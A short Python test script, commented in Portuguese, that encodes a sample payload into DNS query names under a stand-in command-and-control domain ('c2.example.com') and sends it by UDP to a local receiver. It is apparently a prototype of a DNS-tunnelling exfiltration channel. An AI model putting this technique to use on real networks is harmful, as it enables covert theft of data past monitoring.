import sys
from DNS_Research import encode, dns_query, send_udp

data = b"teste de payload"
domain = "c2.example.com"

fqdns = encode(data, domain)
print(f"[*] Enviando query: {fqdns[0]}")

# Manda o pacote pro receiver na 8080
packet = dns_query(fqdns[0], "A")
try:
    send_udp(packet, server="127.0.0.1", port=8080)
except Exception as e:
    # Como o receiver ainda nao responde, vai dar timeout apos 5s (esperado por enquanto)
    print(f"[*] Envio concluido (timeout esperado na resposta: {e})")
